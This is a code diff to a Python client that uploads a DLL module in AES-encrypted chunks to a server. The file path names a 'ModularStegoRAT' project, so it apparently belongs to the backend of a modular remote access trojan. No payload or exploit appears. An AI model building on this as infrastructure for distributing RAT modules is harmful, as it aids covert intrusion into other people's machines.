@@ -163,8 +163,34 @@ def UploadNewModule(moduleName : str, DLLPath : str, description : str, username
     dbResponse = json.loads(aes.decrypt(IncrementNonce(seedNonce,8), dbSocket.recv(1024).rstrip(b"\0"), None).decode())
     print(dbResponse)
 
+    seedNonceIncrement = 9
+    amountToSend = os.path.getsize(DLLPath)
     if(dbResponse["Status"] == "ACCEPTED"):
-        pass
+        with open(DLLPath, "rb") as f:
+            while(amountToSend > 0):
+                chunk = f.read(min(amountToSend, 65536))
+
+                print(int.from_bytes(seedNonce))
+
+                print(len(aes.encrypt(IncrementNonce(seedNonce, seedNonceIncrement), chunk, None)))
+                
+                dbSocket.send(aes.encrypt(IncrementNonce(seedNonce, seedNonceIncrement), chunk, None))
+                amountToSend -= min(amountToSend, 65536)
+                seedNonceIncrement += 1
+    
+        dbResponse = json.loads(aes.decrypt(IncrementNonce(seedNonce,seedNonceIncrement), dbSocket.recv(1024).rstrip(b"\0"), None).decode())
+        print(dbResponse)
+        
+    dbSocket.shutdown(socket.SHUT_RDWR)
+    dbSocket.close()
+        
 
 DefineNewUser("TestUser", "TestPass")
-UploadNewModule("TestMod1", "", "This is a test mod", "TestUser", "TestPass", publicKeyBytes, "")
+UploadNewModule(
+    "TestMod1", 
+    "C:\\Users\\iniga\\OneDrive\\Programming\\ModularStegoRAT\\Modules\\FullSystemModule\\x64\\Debug\\FullSystemModule.dll", 
+    "This is a test mod", 
+    "TestUser", 
+    "TestPass", 
+    publicKeyBytes, 
+    "")
